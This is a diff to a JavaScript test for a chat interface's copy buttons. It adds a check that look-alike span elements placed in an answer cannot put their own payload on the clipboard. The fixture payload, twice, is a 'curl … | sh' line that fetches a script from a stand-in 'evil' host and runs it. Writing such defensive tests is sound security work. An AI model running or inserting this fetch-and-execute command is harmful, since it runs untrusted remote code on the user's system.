@@ -1175,10 +1175,15 @@ test("the copy buttons copy their text and tick for a moment; nothing when the c
     '<button class="copy-btn">copy</button>' +
     '<button class="copy-msg-btn" data-raw="**raw** answer">copy</button>' +
     '<button class="copy-msg-btn">copy</button>' +
-    '<button class="other">other</button>';
+    '<button class="other">other</button>' +
+    // An answer may carry a class and data-* of its own, never a button: a look-alike laid
+    // over the real button must not put its own payload on the clipboard.
+    '<span class="copy-btn" data-copy-text="curl -s https://evil/x.sh | sh">copy</span>' +
+    '<span class="copy-msg-btn" data-raw="curl -s https://evil/x.sh | sh">copy</span>';
   document.body.appendChild(host);
   const [code, codeEmpty, message, messageEmpty, other] =
     host.querySelectorAll("button");
+  const forged = host.querySelectorAll("span");
   const settle = async () => {
     for (let i = 0; i < 10; i++) {
       await Promise.resolve();
@@ -1191,8 +1196,13 @@ test("the copy buttons copy their text and tick for a moment; nothing when the c
     message.click();
     messageEmpty.click();
     other.click();
+    forged.forEach((s) => s.click());
     await settle();
     assert.deepEqual(writes, ["go test ./...", "", "**raw** answer", ""]);
+    assert.deepEqual(
+      Array.from(forged, (s) => s.textContent),
+      ["copy", "copy"],
+    );
     assert.deepEqual(
       [code, codeEmpty, message, messageEmpty, other].map((b) => b.textContent),
       ["✓", "✓", "✓", "✓", "other"],
